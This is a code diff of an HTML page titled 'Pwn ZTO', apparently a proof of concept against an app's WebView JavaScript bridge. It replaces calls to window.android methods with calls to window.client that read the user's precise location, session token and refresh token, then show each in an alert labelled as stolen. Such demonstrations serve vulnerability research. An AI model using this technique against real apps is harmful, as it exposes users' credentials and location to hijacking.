@@ -2,19 +2,26 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Pwn ztkd </title>
+    <title>Pwn ZTO </title>
 </head>
 <body>
 
-<p id="content">attack ZTK </p>
+<p id="content">attack ZTO </p>
 <script>
-starZTKD();
+starZTO();
 
- function starZTKD() {
+ function starZTO() {
+     
+     
+   var stealAddr = window.client.getLocationAddress();
+   alert('窃取到您的实时精确地址位置:'+ stealAddr);
    
-   window.android.goCreate();
-   window.android.goLogin();
-   window.android.goShare("123","456");
+   var stealToken = window.client.getToken();
+   alert('窃取到您的token:'+ stealToken);
+   
+   var stealReToken = window.client.refreshToken();
+   alert('窃取到您的refresh token:'+ stealReToken);
+   
  } 
 </script>
 </body>
